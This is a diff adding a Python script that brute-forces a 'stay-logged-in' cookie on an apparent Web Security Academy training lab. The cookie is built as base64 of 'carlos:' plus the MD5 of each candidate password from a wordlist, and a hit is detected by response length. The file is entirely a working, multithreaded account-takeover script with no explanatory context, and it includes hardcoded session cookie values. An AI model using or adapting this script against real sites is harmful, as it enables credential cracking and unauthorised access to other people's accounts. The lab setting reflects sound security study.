@@ -1,0 +1,70 @@
+#!/usr/bin/python3
+
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
+import requests
+import sys
+import hashlib, base64
+
+url = "https://<id>.web-security-academy.net/my-account"
+
+headers = {
+    "Host": "<id>.web-security-academy.net",
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Referer": "https://<id>.web-security-academy.net/login",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-User": "?1",
+    "Priority": "u=0, i",
+    "Te": "trailers"
+}
+
+cookies = {
+    "session": "WV4VytXPh6OOmUHpen7m02FeqraXAfUc",
+    "stay-logged-in": "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw"
+}
+
+def send_request(identify, delay):
+    if delay > 0:
+        time.sleep(delay)
+    playload = {
+            "session": "WV4VytXPh6OOmUHpen7m02FeqraXAfUc",
+            "stay-logged-in": identify
+}
+    response = requests.get(url, headers=headers, cookies=playload)
+    #print(f"{identify} -- {len(response.text)}")
+    return identify, response
+
+
+if __name__ == "__main__":
+    futures = []
+    checked = 0
+    max_workers = 20
+    request_delay = 0
+    
+    passwds = []
+    with open("../password.txt") as f:
+        for passwd in f:
+            hash_pw = 'carlos:' + hashlib.md5(passwd.strip().encode()).hexdigest()
+            identify_hash = base64.b64encode(hash_pw.encode()).decode("utf-8")
+            passwds.append(identify_hash)
+    
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        for i in passwds:
+            futures.append(executor.submit(send_request, i, delay=request_delay))
+
+        for future in as_completed(futures):
+            identify, response = future.result()
+            checked += 1
+            print(f"\r[+] testing stay-logged-in ({checked}/{len(passwds)}) ... ", end="", flush=True)
+
+            if len(response.text) == 3230:
+                print(f"\nstay-logged-in : {identify}, {len(response.text)}")
+                for pending in futures:
+                    pending.cancel()
+                break
